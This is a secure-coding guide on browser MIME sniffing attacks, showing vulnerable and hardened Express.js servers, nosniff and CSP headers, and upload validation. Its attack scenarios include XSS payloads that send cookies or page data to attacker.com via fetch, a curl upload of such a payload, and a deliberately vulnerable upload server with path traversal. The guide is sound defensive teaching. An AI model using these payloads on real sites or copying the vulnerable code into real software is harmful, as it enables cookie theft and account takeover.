# MIME Sniffing Attacks

## Definition

**MIME sniffing** (also called content-type sniffing) is the behavior where a browser examines the actual content of a file to determine its type, rather than relying solely on the `Content-Type` HTTP header provided by the server. This can be exploited to cause browsers to execute scripts when they should be treated as harmless data, leading to security vulnerabilities. When a server sends a file with an incorrect or missing Content-Type header, a browser may guess the type by inspecting the file contents, potentially causing dangerous execution of script code.

## How MIME Sniffing Works

Browsers employ MIME sniffing to improve user experience when servers misconfigure Content-Type headers. However, this creates a security vulnerability:

### Normal Process (Secure)
1. Server sends response with correct `Content-Type: text/plain`
2. Browser receives header and respects the type
3. Browser displays file as plain text (no script execution)

### MIME Sniffing Attack Process
1. Server sends response with missing or incorrect `Content-Type` header
2. Browser reads the file content to guess the type
3. Browser detects script-like content (e.g., `<script>` tags)
4. Browser treats it as HTML/JavaScript and executes the code
5. Malicious script runs with full page privileges

### Content-Type Confusion

Different MIME types have different security implications:

```
text/plain           → Browser displays as plain text (safe)
text/html            → Browser parses and executes scripts (dangerous)
application/json     → Browser displays JSON (safe)
image/jpeg           → Browser displays as image (safe)
application/pdf      → Browser opens in PDF viewer (may execute scripts)
application/x-javascript → Browser executes as script (dangerous)
text/javascript      → Browser executes as script (dangerous)
```

An attacker can cause a file sent with `text/plain` to be executed as `text/html` through MIME sniffing.

## How Content-Type Confusion Enables Script Execution

### Scenario 1: User-Uploaded Files

```javascript
// ❌ VULNERABLE: No Content-Type set, browser sniffs
app.post('/upload', (req, res) => {
  const file = req.files.upload;

  // Save file without setting Content-Type
  fs.writeFileSync(`./uploads/${file.name}`, file.data);

  // User can now request the file
  // Browser will sniff content and execute if it looks like HTML
});

// User uploads "document.txt" containing:
/*
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
*/

// When accessed via GET /uploads/document.txt:
// Browser sniffs content, sees HTML tags, executes the script
```

### Scenario 2: User-Generated Content in APIs

```javascript
// ❌ VULNERABLE: JSON response without proper Content-Type
app.get('/api/user/:id', (req, res) => {
  const user = db.getUser(req.params.id);

  // Developer assumes JSON APIs are safe from MIME sniffing
  res.send({
    name: user.name,
    bio: user.bio  // Could contain: <script>alert('XSS')</script>
  });

  // Browser may not set Content-Type: application/json
  // If browser sniffs and sees HTML tags, it might execute
});
```

### Scenario 3: SVG + Script Injection

```xml
<!-- ❌ VULNERABLE: SVG can contain scripts -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://attacker.com/steal?data=' + JSON.stringify(document));
  </script>
</svg>

<!-- If served as image/svg+xml, scripts execute -->
<!-- If served without proper Content-Type, browser sniffs and executes -->
```

### Scenario 4: Polyglot Files

Attackers create files that are valid in multiple formats simultaneously:

```
GIF89a;                    ← Valid GIF header
<script>alert('XSS')</script>  ← Valid HTML

This file is both a valid GIF (image/gif) and valid HTML
If browser sniffs incorrectly, it executes the script
```

## The X-Content-Type-Options: nosniff Header

The `X-Content-Type-Options: nosniff` header tells the browser: "Trust the Content-Type header I'm sending and don't sniff the content to guess the actual type."

### How It Works

```http
HTTP/1.1 200 OK
Content-Type: text/plain
X-Content-Type-Options: nosniff

<script>alert('XSS')</script>
```

Browser behavior:
1. Sees `Content-Type: text/plain`
2. Sees `X-Content-Type-Options: nosniff`
3. **Trusts** the Content-Type header
4. Displays content as plain text
5. Script tags are not executed (appears as literal text)

### Browser Support

- Modern browsers (Chrome, Firefox, Edge, Safari): Full support
- Internet Explorer 8+: Full support

## Multipart Content-Type Attacks

Multipart encoding can be exploited if not handled correctly:

```http
HTTP/1.1 200 OK
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"
Content-Type: image/jpeg

<script>alert('XSS')</script>
------WebKitFormBoundary--
```

If the server doesn't validate the declared Content-Type vs. actual content, a browser may sniff and execute the embedded script.

## X-Download-Options for Internet Explorer

Internet Explorer has an additional vulnerability where downloads might be executed in the context of the website.

```http
HTTP/1.1 200 OK
X-Download-Options: noopen
```

This header tells IE: "Don't open/execute downloaded files in the site context."

### Modern Equivalent

Modern browsers are not affected, but the header is sometimes still set for compatibility:

```javascript
res.setHeader('X-Download-Options', 'noopen');
```

## Always Setting Correct Content-Type on Responses

### Correct Content-Type by File Type

```javascript
const mimeTypes = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml; charset=utf-8',
  '.pdf': 'application/pdf',
  '.txt': 'text/plain; charset=utf-8',
  '.xml': 'application/xml; charset=utf-8',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2'
};
```

### API Responses Should Always Specify Content-Type

```javascript
// ✅ CORRECT: Always set Content-Type for API responses
app.get('/api/users', (req, res) => {
  res.setHeader('Content-Type', 'application/json; charset=utf-8');
  res.json({ users: [...] });
});

// ✅ CORRECT: Explicit Content-Type for JSON
app.post('/api/create', (req, res) => {
  const result = { success: true, id: 123 };
  res.setHeader('Content-Type', 'application/json');
  res.end(JSON.stringify(result));
});

// ✅ CORRECT: Text responses with charset
app.get('/status', (req, res) => {
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.send('Server is running');
});
```

## Vulnerable Code Example

```javascript
// ❌ VULNERABLE: server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// No security headers middleware
// MIME sniffing can occur freely

app.post('/upload', express.raw({ limit: '50mb' }), (req, res) => {
  const filename = req.query.filename || 'file.txt';
  const filepath = path.join(__dirname, 'uploads', filename);

  // ❌ VULNERABLE: No Content-Type validation
  // ❌ VULNERABLE: No path traversal protection
  // ❌ VULNERABLE: Saving user file without Content-Type header
  fs.writeFileSync(filepath, req.body);

  res.send('File uploaded');
});

// Serve uploaded files
app.get('/files/:filename', (req, res) => {
  const filepath = path.join(__dirname, 'uploads', req.params.filename);

  // ❌ VULNERABLE: No Content-Type set
  // ❌ VULNERABLE: No X-Content-Type-Options header
  // Browser will sniff the content and may execute scripts
  fs.createReadStream(filepath).pipe(res);
});

// API endpoint
app.get('/api/data', (req, res) => {
  // ❌ VULNERABLE: No explicit Content-Type set
  // Browser may sniff and misinterpret the response
  res.send({
    data: 'Could contain <script>alert("XSS")</script>'
  });
});

app.listen(3000);
```

**Attack Steps with Vulnerable Code:**

```bash
# Step 1: Attacker uploads malicious file
curl -X POST "http://localhost:3000/upload?filename=document.txt" \
  --data '<img src=x onerror="fetch(\"https://attacker.com/steal?c=\"+document.cookie)">'

# Step 2: Victim visits the file
# GET /files/document.txt

# Step 3: Browser receives response without Content-Type header
# Browser sniffs content, sees <img> tag
# Browser executes the onerror handler
# Attacker's server receives the victim's cookies
```

## Secure Code Example

```javascript
// ✅ SECURE: server.js with proper Content-Type handling
const express = require('express');
const fs = require('fs');
const path = require('path');
const helmet = require('helmet');
const mime = require('mime-types');

const app = express();

// Apply security headers
app.use(helmet());

// Ensure X-Content-Type-Options: nosniff is set
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Download-Options', 'noopen');
  next();
});

// Safe file upload with Content-Type validation
const ALLOWED_TYPES = ['text/plain', 'image/jpeg', 'image/png', 'application/pdf'];
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10MB

app.post('/upload', express.raw({ limit: '50mb' }), (req, res) => {
  // ✅ Validate Content-Type from client
  const clientContentType = req.get('Content-Type');
  if (!ALLOWED_TYPES.includes(clientContentType)) {
    return res.status(400).json({
      error: 'File type not allowed',
      allowed: ALLOWED_TYPES
    });
  }

  // ✅ Validate file size
  if (req.body.length > MAX_FILE_SIZE) {
    return res.status(413).json({ error: 'File too large' });
  }

  // ✅ Sanitize filename to prevent path traversal
  const originalFilename = req.query.filename || 'file';
  const sanitizedFilename = path.basename(originalFilename);

  // Generate safe filename with UUID
  const { v4: uuidv4 } = require('uuid');
  const safeFilename = `${uuidv4()}_${sanitizedFilename}`;
  const filepath = path.join(__dirname, 'uploads', safeFilename);

  // ✅ Save file
  fs.writeFileSync(filepath, req.body);

  res.json({
    success: true,
    fileId: safeFilename,
    message: 'File uploaded securely'
  });
});

// Serve uploaded files with proper Content-Type
app.get('/files/:fileId', (req, res) => {
  const fileId = req.params.fileId;

  // ✅ Validate fileId format (UUID_filename)
  const validFileIdRegex = /^[a-f0-9\-]+_.+$/;
  if (!validFileIdRegex.test(fileId)) {
    return res.status(400).json({ error: 'Invalid file ID' });
  }

  const filepath = path.join(__dirname, 'uploads', fileId);

  // ✅ Verify file exists and is within uploads directory
  try {
    const realPath = fs.realpathSync(filepath);
    const uploadsDir = fs.realpathSync(path.join(__dirname, 'uploads'));

    if (!realPath.startsWith(uploadsDir)) {
      return res.status(403).json({ error: 'Access denied' });
    }

    if (!fs.existsSync(realPath)) {
      return res.status(404).json({ error: 'File not found' });
    }
  } catch (err) {
    return res.status(403).json({ error: 'Access denied' });
  }

  // ✅ Determine and set correct Content-Type
  const ext = path.extname(filepath).toLowerCase();
  const contentType = mime.lookup(ext) || 'application/octet-stream';

  // ✅ Set security headers
  res.setHeader('Content-Type', contentType);
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Download-Options', 'noopen');

  // For potentially dangerous types, add extra protection
  if (contentType.includes('html') || contentType.includes('xml')) {
    res.setHeader('Content-Security-Policy', "default-src 'none'");
    res.setHeader('X-Frame-Options', 'DENY');
  }

  // ✅ Stream file to client
  fs.createReadStream(filepath).pipe(res);
});

// API endpoint with explicit Content-Type
app.get('/api/data', (req, res) => {
  // ✅ Always set Content-Type for JSON
  res.setHeader('Content-Type', 'application/json; charset=utf-8');

  // ✅ Always set nosniff
  res.setHeader('X-Content-Type-Options', 'nosniff');

  const data = {
    users: [
      { id: 1, name: 'John Doe' }
    ]
  };

  res.json(data);
});

// Serve static files with proper Content-Type
app.use(express.static('public', {
  // ✅ Set Content-Type based on file extension
  setHeaders: (res, path) => {
    const contentType = mime.lookup(path) || 'application/octet-stream';
    res.setHeader('Content-Type', contentType);
    res.setHeader('X-Content-Type-Options', 'nosniff');

    // Additional protection for HTML files
    if (path.endsWith('.html')) {
      res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    }
  }
}));

app.listen(3000);
```

## Mitigations and Best Practices

### 1. Always Set X-Content-Type-Options: nosniff

```javascript
// Apply globally
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  next();
});

// Or use Helmet
app.use(helmet.noSniff());
```

### 2. Explicitly Set Content-Type for All Responses

```javascript
// For JSON responses
res.setHeader('Content-Type', 'application/json; charset=utf-8');

// For HTML
res.setHeader('Content-Type', 'text/html; charset=utf-8');

// For plain text
res.setHeader('Content-Type', 'text/plain; charset=utf-8');

// Use res.json() or res.type() helpers
res.json(data);        // Automatically sets application/json
res.type('json');      // Sets Content-Type to application/json
res.sendFile(path, {
  root: __dirname,
  headers: {
    'Content-Type': 'text/plain; charset=utf-8'
  }
});
```

### 3. Validate User-Uploaded Files

```javascript
const fileType = require('file-type');

app.post('/upload', express.raw({ limit: '50mb' }), async (req, res) => {
  // ✅ Check actual file type, not just extension or Content-Type header
  const type = await fileType.fromBuffer(req.body);

  const ALLOWED_TYPES = ['image/jpeg', 'image/png', 'application/pdf'];

  if (!type || !ALLOWED_TYPES.includes(type.mime)) {
    return res.status(400).json({
      error: 'File type not allowed',
      detected: type?.mime
    });
  }

  // ✅ Proceed with upload
});
```

### 4. Use File Type Detection Libraries

```bash
npm install file-type mime-types
```

```javascript
const fileType = require('file-type');
const mime = require('mime-types');

async function validateAndServeFile(filepath) {
  // Detect actual file type from magic bytes
  const type = await fileType.fromFile(filepath);

  if (!type) {
    throw new Error('Could not determine file type');
  }

  // Use detected type, not guessed type
  return {
    contentType: type.mime,
    charset: shouldAddCharset(type.mime) ? 'utf-8' : undefined
  };
}
```

### 5. Apply Security Headers for All File Types

```javascript
const SECURITY_HEADERS = {
  'X-Content-Type-Options': 'nosniff',
  'X-Download-Options': 'noopen',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '1; mode=block'
};

app.get('/files/:id', (req, res) => {
  // ✅ Set security headers for all responses
  Object.entries(SECURITY_HEADERS).forEach(([key, value]) => {
    res.setHeader(key, value);
  });

  // Set Content-Type based on file type
  const contentType = getFileContentType(filepath);
  res.setHeader('Content-Type', contentType);

  // Stream file
  fs.createReadStream(filepath).pipe(res);
});
```

### 6. Content Security Policy for Uploaded Content

```javascript
// For user-uploaded HTML or documents
app.get('/documents/:id', (req, res) => {
  // ✅ Restrict what can be executed
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'none'; style-src 'unsafe-inline'; img-src 'self'"
  );

  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Type', 'text/html; charset=utf-8');

  res.sendFile(filepath);
});
```

### 7. Serve User Content in Sandboxed Iframes

```html
<!-- ✅ SAFE: User-generated content in iframe with sandbox -->
<iframe
  src="/view-document/123"
  sandbox="allow-same-origin"
  title="Document Preview">
</iframe>

<!-- Server sets restrictive CSP for this endpoint -->
```

### 8. Use Helmet for Comprehensive Security

```javascript
const helmet = require('helmet');

app.use(helmet({
  noSniff: true,           // Sets X-Content-Type-Options: nosniff
  xssFilter: true,         // Legacy IE protection
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'none'"],
      styleSrc: ["'unsafe-inline'"],
      imgSrc: ["'self'"],
      scriptSrc: ["'self'"]
    }
  }
}));
```

### 9. Test MIME Sniffing Protection

```javascript
// Test endpoint
app.get('/test/mime-sniffing', (req, res) => {
  // ❌ Intentionally vulnerable
  res.send('<script>alert("MIME Sniffing detected!")</script>');
});

// ✅ Secure version
app.get('/test/mime-sniffing-safe', (req, res) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.send('<script>alert("MIME Sniffing detected!")</script>');
});
```

### 10. Regular Security Audits

- Use security headers scanner tools
- Test with different browsers
- Monitor for Content-Type header variations
- Review file upload implementations quarterly

## Real-World Attack Timeline

```
1. Attacker discovers website accepts file uploads
2. Attacker uploads file "document.txt" containing HTML/JavaScript
3. File is stored without Content-Type metadata
4. Attacker sends victim a link to the uploaded file
5. Victim's browser requests the file
6. Server responds without Content-Type header
7. Browser sniffs content, detects HTML tags
8. Browser executes embedded JavaScript as if it were HTML
9. JavaScript steals cookies, authentication tokens, or other data
10. Attacker's server receives the stolen data
```

## Summary

MIME sniffing attacks exploit the browser's content-guessing behavior to execute scripts that should be treated as harmless data. By always setting the `X-Content-Type-Options: nosniff` header, explicitly specifying correct Content-Type headers, validating file types from actual content (not just extensions), and implementing defense-in-depth with CSP and sandboxing, you can effectively prevent MIME sniffing vulnerabilities. This is especially critical for applications that handle user-uploaded files or serve user-generated content.
